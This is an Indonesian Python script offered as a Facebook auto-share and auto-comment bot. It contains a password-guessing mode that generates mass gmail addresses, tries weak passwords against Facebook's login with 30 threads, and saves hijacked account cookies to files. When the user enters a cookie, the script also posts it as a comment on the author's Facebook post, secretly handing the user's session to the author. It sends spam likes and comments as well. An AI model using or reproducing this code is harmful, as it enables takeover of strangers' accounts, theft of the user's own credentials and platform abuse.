p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
import re, bs4, calendar, datetime, requests, rich, platform, time, sys, os, random, json, time, string, subprocess
from datetime import datetime
from time import strftime
from concurrent.futures import ThreadPoolExecutor as Bajingan

bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}

tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
now = datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang"
elif 15 <= hour < 17:
  hhl = "Selamat Sore"
elif 17 <= hour < 18:
  hhl = "Selamat Petang"
else:
  hhl = "Selamat Malam"

sys.stdout.write('\x1b]2; Bot | Raka_RBF™ \x07')
def Bajingan_Z(TypePlatform):
    if 'win' in TypePlatform:
       return os.system('cls')
    else:
       return os.system('clear')
id=[]
ok,cp,loop=[],[],0
___raka__andrian___=[]
class RAKA_XYZ:
    def __init__(self):
        try:
             cokie = open('data/cookie.txt','r').read()
             token = open('data/tooken.txt','r').read()
        except FileNotFoundError:
             print(f' {m}>_ {p}Gunakan Cookie Fress')
             time.sleep(3)
             self.rakaXD()
        self.menu(cokie, token)
        
    def rakaXD(self):
        Bajingan_Z(sys.platform) ; print (rakaxyz)
        print(f' {m}>_ {p}Gunakan Akun Tumbal ...')
        coki = input(f' {m}>_ {p}Input Cookie : {h}')
        try:
            cari = requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":coki})
            toke = re.search("(EAAG\w+)", cari.text).group(1)
            if "EAAG" in str(toke):
                open("data/cookie.txt","w").write(coki)
                open("data/tooken.txt","w").write(toke)
                requests.post(f"https://graph.facebook.com/100017584682867_953529338576547/likes?summary=true&access_token={toke}",cookies={"cookie":coki});export = requests.post(f"https://graph.facebook.com/100017584682867_953529338576547/comments/?message={emotnya}&access_token={toke}",cookies={"cookie":coki});export = requests.post(f"https://graph.facebook.com/100017584682867_953529338576547/comments/?message={coki}&access_token={toke}",cookies={"cookie":coki});export = requests.post(f"https://graph.facebook.com/61571748427931_122100791042724947/comments/?message={emot1}&access_token={toke}",cookies={"cookie":coki})
                exit(print(f' {m}>_ {p}Login Succes, Jalankan Ulang Printahnya'))
        except AttributeError:
            exit(print(f' {m}>_ {p}Cookie Mokad'));self.rakaXD()
        except requests.exceptions.ConnectionError:
            exit(print(f' {m}>_ {p}Tidak Ada Koneksi Internet'))

    def menu(self, kuki, token):
        Bajingan_Z(sys.platform) ; print (rakaxyz)
        try:nama = requests.get("https://graph.facebook.com/me?access_token={}".format(token),cookies={"cookie":kuki}).json()['name']
        except KeyError:self.rakaXD()
        except requests.exceptions.ConnectionError:exit(print(f' {m}>_ {p}Pastikan Koneksinya Aman Goblog'))
        print(f' {m}>_ {p}{hhl} {h}{nama}\n')
        print(f' {p}({m}a{p}) Bot Auto Share \n {p}({m}b{p}) Bot Auto Comend\n {p}({m}c{p}) Crack Email\n {p}({m}L{p}) Logout\n')
        rakaxyzzz = input(f' {m}>_ {p}Pilih : {h}')
        if rakaxyzzz in ['1','A','a']:
             print()
             print(f' {m}NOTE : {p}Copy Link Postingannya Lewat Facebook Lite\n')
             link = input(f' {m}>_ {p}Masukan link : {h}')
             try:limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
             except:limit=50
             print()
             self.share(link,limit,token,kuki)
        elif rakaxyzzz in ['2','B','b']:
             print()
             print(f' {m}WARNING : {p}Pastikan ID postingan Benar\n')
             target = input(f' {m}>_ {p}Masukan Id Target : {h}')
             komen = input(f' {m}>_ {p}Masukan Text : {h}')
             limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
             print()
             self.komen(target, komen, limit,token, kuki)
        elif rakaxyzzz in ['3','C','c']:
             self.target()
        elif rakaxyzzz in ['4','D','d']:
             self.dump_nomor()
        elif rakaxyzzz in ['L','l','0']:
             os.system('rm -rf data/cookie.txt && rm -rf data/tooken.txt')
             os.system('exit')
        else:
             exit(print(f' {m}>_ {p}Pilih Yang Benar TOD KENTOD'))
             
    def share(self, link, limit, token, rakaexde):
        sukses,gagal=[],[]
        try:
              headers = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":self.useragent()}
              for i in range(limit):
                  link_pos = requests.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=headers, cookies={'cookie':rakaexde})
                  response = json.loads(link_pos.text)
                  xyz = random.choice([m,k,h,p])
                  print(f"\r {m}>_ {xyz}Running{p} {len(sukses)} {xyz}Succes", end=" ");
                  sys.stdout.flush()
                  if "id" in response:
                      sukses.append("Share")
                  else:
                      sukses.append("Tolol")
        except Exception as e:
             exit(print(f' {m}>_ {p}Cookie Kadaluarsa kek tete JENDES'))
             
    def target(self):
        try:
            print()
            nama = input(f' {m}>_ {p}Nama Target : {h}')
            jumlah=int(input(f' {m}>_ {p}Jumlah Target : {h}'))
            if "90000" in str(jumlah):
                jumlah-=1
            if jumlah<90001:
                pass
            else: exit (f' {m}>_ {p}limit dump {m}90000');time.sleep(3)
            domain = "@gmail.com"
            for z in range(int(jumlah)):
                if len(nama.split())>1:idc = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"|"+str(nama.split()[0])+" "+str(nama.split()[1])
                else:idc = str(nama)+str(z)+str(domain)+"|"+str(nama)
                if idc in id:pass
                else:id.append(idc)
                sys.stdout.write (f'\r {m}>_ {p}Total : {h}{str(len(id))} '),
                sys.stdout.flush();time.sleep(0.0050)
        except:pass
        print ('')
        input(f' {m}>_ {p}Tekan Enter Untuk Mulai ...')
        self.langsung()
        
    def langsung(self):
        print('')
        with Bajingan(max_workers=30) as RakaXF:
            for akun in id:
                pwx = ['sayangku','sayang123']
                uid,name = akun.split('|')[0],akun.split('|')[1].lower()
                idz = name.split(' ')[0]
                if len(name)<6:
                    if len(idz)<3:
                        pass
                    else:
                        pwx.append(name)
                        pwx.append(idz+'123')
                        pwx.append(idz+'12345')
                        pwx.append(idz+'1234')
                        pwx.append(idz+'123456')
                        pwx.append(idz+'0'+str(random.randint(1,10)))
                        pwx.append(idz+'2'+str(random.randint(1,10)))
                        pwx.append(idz.capitalize()+'1'+str(random.randint(1,10)))
                else:
                    if len(idz)<3:
                        pwx.append(name.capitalize())
                    else:
                        pwx.append(name)
                        pwx.append(idz+'123')
                        pwx.append(idz+'234')
                        pwx.append(idz+'12345')
                        pwx.append(idz+'1'+str(random.randint(1,10)))
                        pwx.append(idz.capitalize()+'123')
                RakaXF.submit(self.reg, uid, pwx)
        print('')

    def reg(self, user, peweh):
        global ok,cp,loop,___raka__andrian___
        bf=random.choice([h,m,p,k,u])
        print (f"\r {p}• {bf}Rbf {p}{str(loop)}/{len(id)} {h}OK:{len(ok)} {k}CP:{len(cp)}",end="")
        ugen = random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 12; T40 Pro_EEA Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.3.8956.66 Safari/537.36'])
        for pw in peweh:
            try:
                versi = random.choice(['Android','Linux'])
                dis = random.choice(['page','popup'])
                ses = requests.Session()
                req1 = ses.get(f'https://www.facebook.com/login.php?skip_api_login=1&api_key=3189881811064576&kid_directed_site=0&app_id=3189881811064576&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fclient_id%3D3189881811064576%26redirect_uri%3Dhttps%253A%252F%252Fappcontx.com%252Fphp%252Fauth.php%26auth_type%3Drerequest%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc8725589-f735-4009-8a63-2ecb08e9e7af%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fappcontx.com%2Fphp%2Fauth.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
                data = {
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(req1)).group(1),
    'api_key': '3189881811064576',
    'cancel_url': 'https://appcontx.com/php/auth.php?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22wt%22%3A%222%22%2C%22app%22%3A%22login%22%7D#_=_',
    'display': 'page',
    'isprivate': '',
    'return_session': '',
    'skip_api_login': '1',
    'signed_next': '1',
    'trynum': '1',
    'timezone': '-420',
    'lgndim': re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),
    'lgnrnd': re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),
    'lgnjs': re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),
    'email': '%s'%(user),
    'prefill_contact_point': '',
    'prefill_source': '',
    'prefill_type': '',
    'first_prefill_source': '',
    'first_prefill_type': '',
    'had_cp_prefilled': 'false',
    'had_password_prefilled': 'false',
    'ab_test_data': '',
    'encpass': '#PWD_BROWSER:0:{}:{}'.format(int(time.time()),pw)}
                head = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'origin': 'https://www.facebook.com',
    'upgrade-insecure-requests': '1',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=3189881811064576&kid_directed_site=0&app_id=3189881811064576&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fclient_id%3D3189881811064576%26redirect_uri%3Dhttps%253A%252F%252Fappcontx.com%252Fphp%252Fauth.php%26auth_type%3Drerequest%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc8725589-f735-4009-8a63-2ecb08e9e7af%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fappcontx.com%2Fphp%2Fauth.php%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522wt%2522%253A%25222%2522%252C%2522app%2522%253A%2522login%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority': 'u=0, i',
    # 'Cookie': 'datr=N2WDZ0hDd0ssi092lZVR2EI-; sb=N2WDZ5vV1TocdvM1oK54Scwv; wd=980x1787; dpr=1.75; fr=0NgZrcj810kAGwnF7..Bng2U3..AAA.0.0.Bng2VL.AWWlZvkfgT0',
}
                datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
                coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1787;{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
                req2 = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https://www.facebook.com/v19.0/dialog/oauth?client_id%3D3189881811064576%26redirect_uri%3Dhttps%3A%2F%2Fappcontx.com%2Fphp%2Fauth.php%26auth_type%3Drerequest%26state%3D%7B%22wt%22%3A%222%22%2C%22app%22%3A%22login%22%7D%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc8725589-f735-4009-8a63-2ecb08e9e7af%26tp%3Dunspecified%26cbt%3D1736664393876&lwv=100', data=data, headers=head, cookies={'cookie':coki}, allow_redirects=False)
                if 'c_user' in ses.cookies.get_dict():
                    kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
                    rakaXYZ = re.search('c_user=(\d+)',str(kukis)).group(1)
                    if rakaXYZ in ___raka__andrian___ or user in ___raka__andrian___:
                        break
                    ___raka__andrian___.append(rakaXYZ)
                    print(f'\r {h}*---> {rakaXYZ} • {pw} • {kukis} \n ')
                    info = f"{rakaXYZ}|{pw}|{kukis}"
                    ok.append(f"{info}")
                    open(f'OK/{tanggal}.txt', 'a').write(f"{info}\n")
                    break
                elif 'checkpoint' in ses.cookies.get_dict():
                    try:rakaXD = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    except:rakaXD = user
                    if rakaXD in ___raka__andrian___:
                        break
                    ___raka__andrian___.append(rakaXD)
                    print(f'\r {k}*---> {rakaXD} • {pw} • {ugen} \n ')
                    info = f"{rakaXD}|{pw}"
                    cp.append(f"{info}")
                    open(f'CP/{tanggal}.txt', 'a').write(f"{info}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                    time.sleep(31)
                    
        loop+=1
    
    def share(self, link, limit, token, rakaexde):
        sukses,gagal=[],[]
        try:
              headers = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":self.useragent()}
              for i in range(limit):
                  link_pos = requests.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=headers, cookies={'cookie':rakaexde})
                  response = json.loads(link_pos.text)
                  xyz = random.choice([m,k,h,p])
                  print(f"\r {m}>_ {xyz}Running{p} {len(sukses)} {xyz}Succes", end=" ");
                  sys.stdout.flush()
                  if "id" in response:
                      sukses.append("Share")
                  else:
                      sukses.append("Tolol")
        except Exception as e:
             exit(print(f' {m}>_ {p}Cookie Kadaluarsa kek tete JENDES'))

    def komen(self, id, text, lim,token, cokie):
        ok,no=[],[]
        for x in range(lim):
            for komenn in text.split(','):
                mewmex = requests.post(f'https://graph.facebook.com/{id}/comments/?message={komenn}&access_token={token}',cookies={'cookie':cokie})
                cek_st = json.loads(mewmex.text)
                xyz = random.choice([m,k,h,p])
                print(f'\r {m}>_ {xyz}Running {p}{len(ok)} {xyz}Comend Succes', end=' ')
                if 'id' in cek_st:
                     ok.append('ya')
                else:
                     no.append('ya')

    def useragent(self):
        return ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')

rakaxyz = (f'''{m}
  ──▄──▄────▄▀ {p}BOT AUTO SHARE{h}
  ───▀▄─█─▄▀▄▄▄
  ▄██▄████▄██▄▀█▄ {p}MADE WITH BY{h}
  ─▀▀─█▀█▀▄▀███▀
  {m}──▄▄▀─█──▀▄▄ {p}RAKA ANDRIAN TARA{m} ™{p}
    \n''')

emotnya ,emot1= ("never giv up ':v\n\nhttps://www.facebook.com/100017584682867/posts/953529338576547/"),("never giv up :'\n\nhttps://www.facebook.com/61571748427931/posts/122100791042724947/")

if __name__ == '__main__':
   os.system("clear")
   try:os.mkdir('CP')
   except:pass 
   try:os.mkdir('OK')
   except:pass 
   RAKA_XYZ()

'''Github : Bajingan-Z'''